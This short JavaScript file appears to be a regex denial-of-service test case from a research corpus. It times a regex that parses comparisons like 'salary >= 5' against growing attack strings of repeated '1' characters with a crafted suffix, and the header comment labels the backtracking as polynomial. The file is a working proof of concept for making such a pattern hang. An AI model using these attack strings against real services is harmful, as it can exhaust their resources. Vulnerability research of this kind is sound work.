/* 4783
 * (((?<numb1>[\d\.-]+)([\s]*?)(?<oper1>(\>=|\<=|=\>|=\<|\<|\>|=){1})([\s]*?)){0,1})(?<varname>(salary|mph|kph|ph){1})((([\s]*?)(?<oper2>(\>=|\<=|=\>|=\<|\<|\>|=){1})([\s]*?)(?<numb2>[\d\.-]+)){0,1})
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:""+"1"*5000+"!1 _!1 _! _1SLQ_1"
 */
var REGEX = /(((?<numb1>[\d\.-]+)([\s]*?)(?<oper1>(\>=|\<=|=\>|=\<|\<|\>|=){1})([\s]*?)){0,1})(?<varname>(salary|mph|kph|ph){1})((([\s]*?)(?<oper2>(\>=|\<=|=\>|=\<|\<|\>|=){1})([\s]*?)(?<numb2>[\d\.-]+)){0,1})/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + '1'.repeat(i*10000) + '!1 _!1 _! _1SLQ_1'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}